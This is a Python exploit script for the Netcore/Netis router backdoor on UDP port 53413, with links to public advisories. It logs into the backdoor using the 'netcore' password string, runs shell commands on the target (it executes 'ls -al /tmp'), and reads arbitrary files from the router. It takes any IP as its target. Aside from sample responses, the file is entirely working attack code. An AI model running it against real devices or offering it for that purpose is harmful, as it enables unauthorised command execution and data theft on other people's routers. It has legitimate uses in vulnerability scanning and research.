#!/usr/bin/python
# -*- coding: utf8 -*-

# NETCORE / NETDIS UDP 53413 BACKDOOR
# https://netisscan.shadowserver.org/
# http://blog.trendmicro.com/trendlabs-security-intelligence/netis-routers-leave-wide-open-backdoor/
# https://www.seebug.org/vuldb/ssvid-90227

import socket
import struct
import logging


logging.basicConfig(level=logging.INFO, format="%(message)16s")


def create_udp_socket(timeout=10):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)

    return sock


def send_netcore_request(sock, host, port, data):
    HEAD = "\x00" * 8
    data = HEAD + data
    sock.sendto(data, (host, port))


def recv_netcore_response(sock, buffsize=512):
    try:
        resp = None
        addr = None
        resp, addr = sock.recvfrom(buffsize)
    except Exception as err:
        logging.debug('[-] %s' % err)
    finally:
        return resp, addr


def do_mptlogin(sock, host, port):
    """
    login netcore backdoor
    """

    netcore_response = []
    netcore_commands = ['netcore', '?']
    for command in netcore_commands:
        send_netcore_request(sock, host, port, command)
        resp, addr = recv_netcore_response(sock)

        if resp and resp not in netcore_response:
            netcore_response.append(resp)

    response_string = ",".join(netcore_response)
    if len(netcore_response) >= 1 and ('\x00\x00\x00\x05' in response_string):
        return (True, netcore_response)

    return (False, netcore_response)

    # ['\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x00Login successed!\r\n',
    #  '\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x7f']

    # ['\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x7f',
    #  '\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x01\x00'
    #  'IGD MPT Interface daemon 1.0\x00']

    # ['\x00\x00\x00\x06\x00\x01\x00\x00\xff\xff\xff\xffapmib_init fail!\r\n']

    # ['\x00\x00\x00\x05\x00\x02\x00\x00\x00\x00\x00\x00']
    # sh: netcore: not found
    # sh: /etc/services: Permission denied

    # ['\x00\x00\x00\x05\x00\x02\x00\x00\x00\x00\x00\x00']

    # First Login  : 'AA\x00\x05ABAA\x00\x00\x00\x00Login successed!\r\n'
    # Second Login : IGD MPT Interface daemon 1.0


def do_mptfun(sock, host, port, cmdstring):
    """
    Usage: $Help
    Usage: $WriteMac <macaddr> <lan|wan|wlan1|wlan2|wlan3|wlan4>
    Usage: $ReadMac <lan|wan|wlan1|wlan2|wlan3|wlan4>[<str|STR>[separator]|bin]
    Usage: $WriteRegion <region> <wlan1|wlan3>
    Usage: $ReadRegion <wlan1|wlan3>
    Usage: $WriteSSID <SSID> <wlan1|wlan2|wlan3|wlan4>
    Usage: $ReadSSID <wlan1|wlan2|wlan3|wlan4>

    DESCRIPTION:
    wlan1:2.4G main AP
    wlan2:2.4G Multiple AP
    wlan3:5G Main AP
    wlan4:5G Multiple AP
    region:the abbreviation of the country,Must be capitalized.Like US,HK,JP
    """

    send_netcore_request(sock, host, port, cmdstring)
    resp, addr = recv_netcore_response(sock)

    if resp:
        return (True, resp)

    return (False, resp)


do_syscmd = do_mptfun


def do_getfile(sock, host, port, filename):
    buffsize = 0x408  # buff size to read
    datasize = 0x408  # data size from socket

    contents = []

    u1, u2, u3, u4 = 0, 1, 0, 0

    HEAD = struct.pack('>H', u1)
    HEAD += struct.pack('>H', u2)
    HEAD += struct.pack('>H', u3)
    HEAD += struct.pack('>H', u4)

    data = HEAD + filename
    sock.sendto(data, (host, port))

    while buffsize == datasize:
        data, addr = recv_netcore_response(sock, buffsize=buffsize)

        if not data:
            break

        datasize = len(data)

        u1, u2, u3, u4 = struct.unpack('>HHHH', data[:8])
        contents.append(data[8:])

        u2 = 5

        HEAD = struct.pack('>H', u1)
        HEAD += struct.pack('>H', u2)
        HEAD += struct.pack('>H', u3)
        HEAD += struct.pack('>H', u4)
        sock.sendto(HEAD, (host, port))

    data = "".join(contents)
    if contents:
        return True, data

    return False, data


def do_putfile():
    pass


def check(host, port=53413):
    sock = create_udp_socket(timeout=8)
    is_login, resp = do_mptlogin(sock, host, port)
    print(is_login, resp)
    if is_login:
        print("[+] %s:%s - \033[32mvulnerable\033[m" % (host, port))

        # bool_ret, resp = do_mptfun(sock, host, port, '$help')
        # print(resp)

        # bool_ret, resp = do_getfile(sock, host, port, '/cfg/dhcpd.conf')
        # print(resp)

        bool_ret, resp = do_syscmd(sock, host, port, 'ls -al /tmp')

    sock.close()


if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("[*] Usage: {} <target-netdis-ip>".format(sys.argv[0]))
    else:
        check(sys.argv[1])